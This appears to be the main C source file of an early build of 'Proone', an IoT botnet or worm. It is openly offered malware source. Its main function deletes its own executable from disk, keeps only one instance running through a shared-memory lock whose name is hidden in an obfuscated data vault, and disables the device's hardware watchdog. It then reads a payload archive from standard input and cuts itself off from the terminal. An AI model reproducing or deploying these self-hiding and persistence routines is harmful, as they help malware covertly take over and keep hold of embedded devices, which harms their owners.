#define _GNU_SOURCE
#include "proone.h"
#include "proone_util.h"
#include "proone_dvault.h"

#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/file.h>


proone_global_t pne_global;


static bool ensure_single_instance (void) {
    int fd;

    fd = shm_open(
        proone_dvault_unmask_entry_cstr(PROONE_DATA_KEY_PROC_LIM_SHM),
        O_RDWR | O_CREAT | O_TRUNC,
        0666);
    proone_dvault_reset_dict();
    if (fd < 0) {
        return true;
    }

    if (flock(fd, LOCK_EX | LOCK_NB) < 0) {
        return errno != EWOULDBLOCK;
    }
    else {
        pne_global.has_proc_lim_lock = true;
    }

    return true;
}

static void init_rnd_engine (void) {
    uint32_t seed = 0;
    int fd;
    proone_rnd_engnie_alloc_result_t ret;

    fd = open("/dev/urandom", O_RDONLY);
    if (fd >= 0) {
        read(fd, &seed, sizeof(uint32_t));
        close(fd);
    } 

    if (seed == 0) {
        // fall back to seeding with what's available.
        seed =
            (uint32_t)(time(NULL) % 0xFFFFFFFF) ^
            (uint32_t)(getpid() % 0xFFFFFFFF) ^
            (uint32_t)(getppid() % 0xFFFFFFFF) ^
            (uint32_t)(clock() % 0xFFFFFFFF);
    }
    
    ret = proone_alloc_rnd_engine(seed == 0 ? NULL : &seed);
    if (ret.result != PROONE_RND_ENGINE_ALLOC_OK) {
        abort();
    }

    pne_global.rnd = ret.engine;
}

static void delete_myself (const char *arg0) {
    static const char *proc_path = "/proc/self/exe";
    struct stat st;
    const char *path_to_unlink = NULL;
    char *path_buf = NULL;    
    
    // get real path of myself
    if (lstat(proc_path, &st) == 0 && (path_buf = (char*)malloc(st.st_size + 1)) != NULL && readlink(proc_path, path_buf, st.st_size + 1) == st.st_size) {
        path_buf[st.st_size] = 0;
        path_to_unlink = path_buf;
    }
    else {
        // try to delete arg0 instead
        path_to_unlink = arg0;
    }

    unlink(path_to_unlink);
    free(path_buf);
}

static void disasble_watchdog (void) {
    static const char *watchdog_paths[] = {
        "/dev/watchdog",
        "/dev/misc/watchdog"
    };
    static const int one = 1;
    int fd;
    size_t i;

    for (i = 0; i < sizeof(watchdog_paths) / sizeof(const char*); i += 1) {
        if ((fd = open(watchdog_paths[i], O_RDWR)) >= 0) {
            ioctl(fd, 0x80045704, &one);
            close(fd);
            break;
        }
    }
}


int main (const int argc, char **args) {
    int exit_code = 0;
    bool main_loop_flag = true;

    pne_global.has_proc_lim_lock = false;
    pne_global.bin_ready = false;
    proone_init_unpack_bin_archive_result(&pne_global.bin_pack);
    proone_init_bin_archive(&pne_global.bin_archive);

    /* quick prep. IN THIS ORDER! */
    delete_myself(args[0]);
    if (!ensure_single_instance()) {
        exit_code = 1;
        goto END;
    }
    disasble_watchdog();
    init_rnd_engine();

    // get fed with the bin archive
    puts(proone_dvault_unmask_entry_cstr(PROONE_DATA_KEY_SIGN_INIT_OK));
    proone_dvault_reset_dict();
    pne_global.bin_pack = proone_unpack_bin_archive(STDIN_FILENO);
    if (pne_global.bin_pack.result == PROONE_UNPACK_BIN_ARCHIVE_OK) {
        pne_global.bin_ready = proone_index_bin_archive(&pne_global.bin_pack, &pne_global.bin_archive) == PROONE_INDEX_BIN_ARCHIVE_OK;
    }
    
    // done with the terminal
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
    errno = 0;

    do {
        
    } while (main_loop_flag);

END:
    if (pne_global.has_proc_lim_lock) {
        shm_unlink(proone_dvault_unmask_entry_cstr(PROONE_DATA_KEY_PROC_LIM_SHM));
        proone_dvault_reset_dict();
    }

    return exit_code;
}
